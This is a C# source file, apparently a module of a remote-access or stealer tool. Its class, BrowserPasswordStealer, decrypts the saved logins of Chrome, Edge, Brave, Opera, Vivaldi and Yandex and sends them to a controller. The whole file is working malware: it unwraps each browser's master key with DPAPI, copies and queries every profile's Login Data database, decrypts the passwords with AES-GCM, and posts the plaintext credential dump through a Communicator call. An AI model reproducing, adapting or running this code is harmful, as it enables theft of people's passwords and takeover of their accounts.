using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Data.SQLite;
using System.Text.Json;
using True.Core;

namespace True.Features
{
    internal static class BrowserPasswordStealer
    {
        private static readonly string[] Targets = new[]
         {
            "Chrome|Google\\Chrome",
            "Edge|Microsoft\\Edge",
            "Brave|BraveSoftware\\Brave-Browser",
            "Opera|Opera Software\\Opera Stable",
            "Vivaldi|Vivaldi",
            "Yandex|Yandex\\YandexBrowser"
        };

        public static void Run()
        {
            StringBuilder result = new();
            result.AppendLine($"[Browser Credential Dump] {DateTime.Now}");
            result.AppendLine();

            foreach (var target in Targets)
            {
                var parts = target.Split('|');
                string browser = parts[0];
                string basePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), parts[1]);

                try
                {
                    string localState = Path.Combine(basePath, "User Data", "Local State");
                    if (!File.Exists(localState)) continue;

                    byte[] masterKey = GetMasterKey(localState);
                    string userDataDir = Path.Combine(basePath, "User Data");

                    foreach (var profile in GetProfiles(userDataDir))
                    {
                        string loginData = Path.Combine(userDataDir, profile, "Login Data");
                        if (!File.Exists(loginData)) continue;

                        string tempCopy = Path.GetTempFileName();
                        File.Copy(loginData, tempCopy, true);

                        try
                        {
                            using var conn = new SQLiteConnection($"Data Source={tempCopy};Version=3;");
                            conn.Open();

                            using var cmd = new SQLiteCommand("SELECT origin_url, username_value, password_value FROM logins", conn);
                            using var reader = cmd.ExecuteReader();

                            while (reader.Read())
                            {
                                string url = reader.GetString(0);
                                string username = reader.GetString(1);
                                byte[] encryptedPassword = (byte[])reader[2];

                                if (encryptedPassword == null || encryptedPassword.Length < 15)
                                    continue;

                                string decrypted = Decrypt(encryptedPassword, masterKey);
                                result.AppendLine($"[{browser}][{profile}] {url} → user: {username} / pass: {decrypted}");
                            }
                        }
                        catch (Exception ex)
                        {
                            result.AppendLine($"[{browser}][{profile}] error: {ex.Message}");
                        }
                        finally
                        {
                            File.Delete(tempCopy);
                        }
                    }
                }
                catch (Exception ex)
                {
                    result.AppendLine($"[{browser}] outer error: {ex.Message}");
                }
            }

            string final = result.ToString().Trim();
            Communicator.PostResponse("browser_credentials", string.IsNullOrWhiteSpace(final) ? "No credentials found." : final).Wait();
        }

        private static byte[] GetMasterKey(string localStatePath)
        {
            string json = File.ReadAllText(localStatePath);
            using var doc = JsonDocument.Parse(json);
            string base64 = doc.RootElement.GetProperty("os_crypt").GetProperty("encrypted_key").GetString();
            byte[] encryptedKey = Convert.FromBase64String(base64)[5..]; // Strip DPAPI prefix
            return ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
        }

        private static string Decrypt(byte[] encrypted, byte[] masterKey)
        {
            try
            {
                string header = Encoding.ASCII.GetString(encrypted, 0, 3);
                if (header == "v10" || header == "v11")
                {
                    byte[] nonce = encrypted[3..15];
                    byte[] ciphertext = encrypted[15..^16];
                    byte[] tag = encrypted[^16..];
                    byte[] decrypted = new byte[ciphertext.Length];

                    using var aes = new AesGcm(masterKey);
                    aes.Decrypt(nonce, ciphertext, tag, decrypted);

                    return Encoding.UTF8.GetString(decrypted);
                }
                else
                {
                    // Fallback to old DPAPI (non-AES) encryption
                    return Encoding.UTF8.GetString(ProtectedData.Unprotect(encrypted, null, DataProtectionScope.CurrentUser));
                }
            }
            catch
            {
                return "(decryption failed)";
            }
        }

        private static IEnumerable<string> GetProfiles(string userDataDir)
        {
            try
            {
                return Directory.GetDirectories(userDataDir)
                    .Select(Path.GetFileName)
                    .Where(p => p != null && (p.StartsWith("Default") || p.StartsWith("Profile")))
                    .ToList();
            }
            catch
            {
                return new List<string> { "Default" };
            }
        }
    }
}
